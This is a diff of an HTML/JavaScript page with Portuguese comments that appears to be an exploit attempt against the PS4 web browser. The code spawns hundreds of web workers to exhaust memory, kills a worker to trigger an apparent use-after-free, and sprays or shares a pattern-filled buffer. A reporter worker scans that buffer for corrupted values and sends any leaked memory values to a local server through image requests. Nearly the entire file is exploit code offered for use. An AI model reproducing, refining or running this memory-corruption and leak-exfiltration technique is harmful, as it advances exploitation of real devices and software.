@@ -2,130 +2,156 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 STABLE LOGGER (ANTI-OOM) 2</title>
+    <title>PS4 THRESHOLD SCANNER (TARGET 400)</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
-        #status { font-size: 2em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
-        .sending { color: #ff0; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
+        body { background-color: #000; color: #ff0; font-family: monospace; text-align: center; padding: 20px; }
+        #status { font-size: 2em; border: 2px solid #555; padding: 20px; margin: 20px 0; background: #220; }
+        .danger { background-color: #500 !important; color: #fff !important; animation: shake 0.5s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
     </style>
 </head>
 <body>
 
-    <h1>STABLE LOGGER (360 THREADS)</h1>
-    <div id="status">VERIFIQUE O IP!</div>
+    <h1>THRESHOLD SCANNER (AUTO-TRIGGER)</h1>
+    <div id="status">INICIALIZANDO...</div>
 
     <script>
         // --- CONFIGURAÇÃO ---
-        const SERVER_IP = "192.168.3.19"; // SEU IP CONFIRMADO
+        const SERVER_IP = "192.168.3.19"; // SEU IP
         const SERVER_PORT = "8000";
         
-        // REDUZIDO PARA EVITAR CRASH PRECOCE (OOM)
-        const TARGET_THREADS = 400; 
+        // LIMITES
+        const SCAN_START = 390; // Começa a aquecer aqui
+        const DANGER_ZONE = 400; // Onde o crash costuma acontecer
+        const MAX_THREADS = 425; // Alvo final (se sobreviver)
         
         const STRUCT_SIZE = 128; // 512 bytes
-        const PATTERN = 0xCAFEBABE;
+        const PATTERN = 0x41414141; // AAAA
 
         let workers = [];
-        let sensorArray = new Uint32Array(STRUCT_SIZE);
-        // Array para segurar o spray e impedir o Garbage Collector
-        let sprayStorage = []; 
-        let hasLeaked = false;
+        let scanning = false;
         
-        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
-        const url = URL.createObjectURL(blob);
+        // Buffer compartilhado para velocidade máxima entre threads
+        const sharedBuffer = new SharedArrayBuffer(STRUCT_SIZE * 4);
+        const sensorArray = new Uint32Array(sharedBuffer);
+        
+        // WORKER 1: REPÓRTER (Lê memória e envia)
+        const reporterCode = `
+            onmessage = function(e) {
+                const ip = e.data.ip;
+                const port = e.data.port;
+                const buffer = new Uint32Array(e.data.buffer);
+                const pattern = e.data.pattern;
+                let active = false;
+
+                // Aguarda comando de início
+                setInterval(() => {
+                    if (e.data.start && !active) active = true;
+                }, 100);
+
+                // Loop de Scan (Roda sempre, mas só envia quando ativado)
+                setInterval(() => {
+                    // Verifica se o buffer foi corrompido (Valor != AAAA e != 0)
+                    for(let i=0; i<buffer.length; i++) {
+                        let val = buffer[i];
+                        if (val !== 0 && val !== pattern) {
+                            // ACHOU! ENVIA TUDO!
+                            // Usa Image para evitar bloqueio de thread principal
+                            const hex = val.toString(16);
+                            new Image().src = "http://" + ip + ":" + port + "/LEAK_OFF_" + (i*4) + "_VAL_" + hex;
+                        }
+                    }
+                }, 1); // 1ms = Velocidade Extrema
+            }
+        `;
+        const reporterBlob = new Blob([reporterCode], {type:'text/javascript'});
+        const reporterUrl = URL.createObjectURL(reporterBlob);
+        const reporter = new Worker(reporterUrl);
+
+        // WORKER 2: CARGA (Apenas peso)
+        const loadBlob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
+        const loadUrl = URL.createObjectURL(loadBlob);
+
+        // WORKER 3: KAMIKAZE (Gatilho)
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
-        function start() {
-            // Preenche sensor
+        function init() {
+            // Limpa sensor
             sensorArray.fill(PATTERN);
-            sensorArray[0] = 0x11111111; 
-            sensorArray[STRUCT_SIZE-1] = 0x99999999;
-
-            document.getElementById('status').innerText = `CONECTADO A ${SERVER_IP}\nINICIANDO...`;
-            logToAndroid("TESTE_INICIADO_360_THREADS");
             
-            createThreads();
+            // Inicia Repórter
+            reporter.postMessage({
+                ip: SERVER_IP,
+                port: SERVER_PORT,
+                buffer: sharedBuffer,
+                pattern: PATTERN,
+                start: false // Ainda não
+            });
+
+            // Teste de Rede
+            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/TESTE_INICIADO`;
+            
+            document.getElementById('status').innerText = "SUBINDO PRESSÃO...";
+            loop();
         }
 
-        function createThreads() {
+        function loop() {
+            // Cria threads gradualmente
             let i = setInterval(() => {
-                if (workers.length < TARGET_THREADS) {
-                    workers.push(new Worker(url));
-                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
-                } else {
-                    clearInterval(i);
-                    document.getElementById('status').innerText = "DISPARANDO GATILHO...";
-                    document.getElementById('status').className = "sending";
-                    
-                    // Inicia o Scanner ANTES do gatilho para pegar no pulo
-                    setInterval(scanAndSend, 5); 
-                    
-                    // Pequena pausa para estabilizar
-                    setTimeout(triggerFreeze, 500);
+                
+                // Adiciona worker
+                if(workers.length < MAX_THREADS) {
+                    workers.push(new Worker(loadUrl));
                 }
-            }, 40); // Um pouco mais lento para não estressar a CPU
+
+                // Atualiza UI
+                if(workers.length % 10 === 0) {
+                    document.getElementById('status').innerText = `THREADS: ${workers.length}`;
+                }
+
+                // GATILHO 1: WARMUP (390)
+                if(workers.length === SCAN_START && !scanning) {
+                    scanning = true;
+                    // Avisa o repórter para ficar atento, mas o payload ainda não foi enviado
+                    // Isso abre as conexões TCP
+                    new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/WARMUP_390`;
+                }
+
+                // GATILHO 2: DANGER ZONE (400)
+                if(workers.length >= DANGER_ZONE) {
+                    document.getElementById('status').innerText = `ZONA DE PERIGO (${workers.length}) - ESCANEANDO!`;
+                    document.getElementById('status').className = "danger";
+                    
+                    // 1. Tenta liberar memória e ocupar com o sensor
+                    triggerUAF();
+                    
+                    // 2. Continua subindo threads para causar o pânico
+                    // O Reporter já está lendo o sharedBuffer loucamente em background
+                }
+
+                // Se passar muito, para
+                if(workers.length >= MAX_THREADS) clearInterval(i);
+
+            }, 40); // 40ms entre threads (mais rápido que antes)
         }
 
-        function triggerFreeze() {
-            // 1. Mata a thread (Cria o buraco)
+        function triggerUAF() {
+            // Tenta criar buracos na memória
             const w = new Worker(killerUrl);
             w.terminate();
-            
-            // 2. SPRAY IMEDIATO (Tenta preencher o buraco com força bruta)
-            // Criamos 200 cópias do sensor para garantir que pegamos o slot
-            for(let k=0; k<200; k++) {
-                let arr = new Uint32Array(STRUCT_SIZE);
-                arr.set(sensorArray);
-                sprayStorage.push(arr); // Salva referência
-            }
+
+            // Tenta forçar o sensor (SharedBuffer) para o buraco
+            try {
+                // Truque: Criar uma view do buffer e acessar
+                // Isso força o mapeamento na memória física
+                let v = new Uint32Array(sharedBuffer);
+                v[0] = PATTERN; 
+            } catch(e) {}
         }
 
-        function scanAndSend() {
-            if(hasLeaked) return; 
-
-            // Varre TODOS os arrays do spray
-            // Se o Kernel escrever em QUALQUER um deles, nós pegamos.
-            for(let k=0; k < sprayStorage.length; k++) {
-                const arr = sprayStorage[k];
-                
-                // Otimização: Checa apenas o offset 16 e 32 primeiro (onde geralmente ficam os ponteiros)
-                // Se o começo do array foi corrompido, scaneia tudo
-                if (arr[0] !== 0x11111111 || arr[16] !== PATTERN) {
-                    
-                    for(let i=0; i < STRUCT_SIZE; i++) {
-                        if (arr[i] !== PATTERN && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
-                            const val = arr[i] >>> 0;
-                            if (val !== 0) {
-                                const hex = val.toString(16).padStart(8, '0');
-                                hasLeaked = true;
-                                document.body.style.backgroundColor = "#fff";
-                                
-                                // ENVIA O OURO
-                                logToAndroid(`OFFSET_${i*4}_${hex}`);
-                                
-                                // Tenta enviar o próximo também (64-bit pointer high part)
-                                if(i+1 < STRUCT_SIZE) {
-                                    const nextVal = arr[i+1] >>> 0;
-                                    logToAndroid(`NEXT_${(i+1)*4}_${nextVal.toString(16)}`);
-                                }
-                                return; // Envia só um para ser rápido
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-        function logToAndroid(data) {
-            const img = new Image();
-            img.src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
-        }
-
-        setTimeout(start, 2000);
+        setTimeout(init, 1000);
 
     </script>
 </body>
 </html>
-
